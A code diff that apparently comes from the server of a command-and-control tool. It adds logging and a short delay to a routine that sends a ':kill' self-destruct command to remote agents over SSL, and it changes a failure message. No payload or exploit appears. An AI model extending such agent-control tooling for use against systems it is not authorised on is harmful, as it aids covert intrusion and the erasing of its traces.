@@ -8,6 +8,8 @@
 #include <sstream>
 #include <vector>
 #include <mutex>
+#include <thread>
+#include <chrono>
 
 #ifdef _WIN32
 #include <winsock2.h>
@@ -78,11 +80,15 @@ void IPCServerThread() {
                 if (active_sessions.count(id)) {
                     // Send :kill signal
                     bool sent = SendSecureMessage(active_sessions[id].ssl, ":kill");
+                    std::cout << "[*] Sent :kill to session " << id << " (success: " << sent << ")" << std::endl;
                     std::string output;
                     
                     // Try to receive final acknowledgment, but don't hang if agent dies instantly
                     if (sent) {
+                        // Add a small delay to allow agent to respond
+                        std::this_thread::sleep_for(std::chrono::milliseconds(500));
                         ReceiveSecureMessage(active_sessions[id].ssl, output);
+                        std::cout << "[*] Received acknowledgment from session " << id << ": " << output << std::endl;
                     }
                     
                     SSL_free(active_sessions[id].ssl);
@@ -91,7 +97,7 @@ void IPCServerThread() {
                     if (sent) {
                         response = "KILLED|" + (output.empty() ? "Agent self-destructed successfully." : output);
                     } else {
-                        response = "KILLED|Agent connection lost (likely self-destructed).";
+                        response = "KILLED|Failed to send kill signal.";
                     }
                 } else {
                     response = "ERR_ID";
